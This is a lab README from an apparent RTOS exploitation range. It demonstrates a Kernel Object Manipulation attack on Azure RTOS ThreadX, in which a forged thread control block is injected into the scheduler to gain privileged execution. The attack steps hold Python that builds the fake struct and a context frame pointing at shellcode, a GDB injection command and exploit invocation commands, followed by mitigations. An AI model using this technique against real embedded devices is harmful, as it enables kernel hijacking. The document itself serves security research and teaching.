# KOM-ThreadX: Kernel Object Manipulation Attack on Azure RTOS ThreadX

## Background

Kernel Object Manipulation (KOM) is an attack class identified in the paper
"KOM: Attacking RTOS Kernels via Kernel Object Manipulation" (USENIX Security 2025).
KOM exploits the fact that most RTOS kernels treat kernel object pointers
(thread control blocks, semaphores, mutexes) as trusted without runtime validation.

This range demonstrates KOM against Azure RTOS ThreadX 6.x by constructing a
fake `TX_THREAD` struct and injecting it into the scheduler run list.

**No CVE assigned** — this is a class-level vulnerability affecting the RTOS design.
**CVSS:** N/A (design flaw, not a specific bug)
**Impact:** Kernel execution redirection, privilege escalation, scheduler hijack

## ThreadX Kernel Object Model

ThreadX represents threads as `TX_THREAD` structs in memory. The scheduler
maintains a run list of ready threads via doubly-linked list pointers within
the struct. Key fields:

```c
typedef struct TX_THREAD_STRUCT {
    ULONG           tx_thread_id;           // Must be TX_THREAD_ID (0x54485244)
    CHAR           *tx_thread_name;
    VOID           *tx_thread_stack_ptr;    // Current stack pointer (saved context)
    VOID           *tx_thread_stack_start;
    VOID           *tx_thread_stack_end;
    ULONG           tx_thread_stack_size;
    UINT            tx_thread_priority;     // 0 = highest
    // ... 50+ more fields
    UINT            tx_thread_state;        // TX_READY=0, TX_SUSPENDED=4, ...
    TX_THREAD      *tx_run_list_next;       // Run list pointers
    TX_THREAD      *tx_run_list_prev;
    // ...
} TX_THREAD;
```

The KOM insight: `tx_thread_resume()` accepts a `TX_THREAD *` and inserts it into
the run list based only on `tx_thread_id` validation. It does not verify that the
pointer refers to a thread that was ever created via `tx_thread_create()`.

## Vulnerability Mechanism

```c
// ThreadX tx_thread_resume.c (simplified):
UINT _tx_thread_resume(TX_THREAD *thread_ptr) {
    // Only check: is this a valid TX_THREAD ID?
    if (thread_ptr->tx_thread_id != TX_THREAD_ID) {
        return TX_PTR_ERROR;  // ID check passes if we set it correctly
    }

    // No check: was this thread ever created?
    // No check: is this pointer in kernel-owned memory?
    // No check: does the stack pointer point to valid memory?

    // Insert into priority-based run list:
    _tx_thread_system_resume(thread_ptr);  // Scheduler now owns our fake object
    return TX_SUCCESS;
}
```

## Attack Steps

### Step 1: Obtain Write Primitive

Any write primitive into SRAM works:
- Stack overflow in a task
- Heap overflow (e.g., via FreeRTOS+TCP-style bug if network stack is included)
- Out-of-bounds write in application code

### Step 2: Build Fake TX_THREAD

Construct a fake `TX_THREAD` struct in attacker-controlled SRAM:

```python
# Set tx_thread_id to valid value
struct.pack_into("<I", tcb, 0x00, 0x54485244)  # TX_THREAD_ID

# Set saved stack pointer to our fake context frame
struct.pack_into("<I", tcb, 0x08, fake_saved_sp)

# Set priority to 0 (highest -- preempts all real tasks)
struct.pack_into("<I", tcb, 0x18, 0)

# Set state to TX_READY
struct.pack_into("<I", tcb, 0x48, 0)
```

### Step 3: Build Fake Context Frame

The saved context frame is what the scheduler restores when switching to our thread.
On Cortex-M, this includes the exception return frame (R0-R3, R12, LR, PC, xPSR):

```python
# Saved context pointing to shellcode
context_frame = struct.pack("<IIIIIIII",
    0, 0, 0, 0, 0,   # R4-R8 (software-pushed)
    0, 0, 0,          # R9-R11
) + struct.pack("<IIIIIIII",
    0, 0, 0, 0, 0,   # R0-R3, R12
    0xFFFFFFFD,       # LR (EXC_RETURN)
    shellcode_addr | 1,  # PC (shellcode address)
    0x01000000,       # xPSR (Thumb)
)
```

### Step 4: Register Fake Thread

Call `tx_thread_resume()` with the fake TCB address (via GDB or by controlling
the application call path):

```
(gdb) call tx_thread_resume(0x20010000)
```

### Step 5: Wait for Context Switch

ThreadX's PendSV handler runs the scheduler. Because our fake thread has
priority 0 (highest), it immediately preempts all running tasks.
The scheduler restores our fake context, loading the shellcode address into PC.

### Step 6: Shellcode Executes

The CPU jumps to shellcode. Since ThreadX runs in privileged mode and does not
enable the MPU for thread switching, shellcode runs fully privileged.

## Running the Exploit

```bash
# Start firmware with GDB enabled
rtosploit emulate --firmware vulnrange/KOM-ThreadX/firmware.bin --machine mps2-an385 --gdb

# Run exploit (connects via GDB to inject fake TCB)
python vulnrange/KOM-ThreadX/exploit.py 1238
```

## Mitigation Approaches

ThreadX does not currently validate that TCB pointers refer to kernel-managed objects.
Mitigations require design-level changes:

1. **Kernel Object Registry**: Maintain a list of valid TCB addresses at creation time.
   Validate all API pointers against the registry before use.

2. **MPU Isolation**: Place `TX_THREAD` structs in MPU-protected kernel memory.
   Application code cannot write to thread control blocks.

3. **Cryptographic Tags**: Use ASLR-derived or random tags in `tx_thread_id` that
   cannot be predicted by attackers.

4. **Bounds Checking**: Validate that TCB pointers fall within the kernel heap region.

## Research Reference

- KOM Paper: "KOM: Attacking RTOS Kernels via Kernel Object Manipulation"
  USENIX Security Symposium, August 2025
- Azure RTOS ThreadX Source: https://github.com/eclipse-threadx/threadx
- ThreadX Architecture Guide: https://learn.microsoft.com/azure-rtos/threadx
